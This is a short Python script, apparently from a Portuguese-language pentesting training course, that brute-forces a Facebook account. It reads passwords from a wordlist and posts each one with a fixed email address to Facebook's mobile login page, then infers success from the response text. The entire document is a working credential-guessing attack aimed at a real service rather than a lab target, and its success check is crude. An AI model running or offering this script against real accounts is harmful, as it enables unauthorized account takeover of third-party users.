#####################################
# Python para Pentesters            #
# https://solyd.com.br/treinamentos #
#####################################

import requests

url = 'https://m.facebook.com/login.php'

arquivo = open('password.txt')
linhas = arquivo.readlines()

for linha in linhas:
    dados = {'email': 'haxcoder11@gmail.com',
             'pass': linha}

    resposta = requests.post(url, data=dados)

    if "Search Facebook" in resposta.text:
        print "incorrect pass:", linha
    else:
        print " password is:", linha
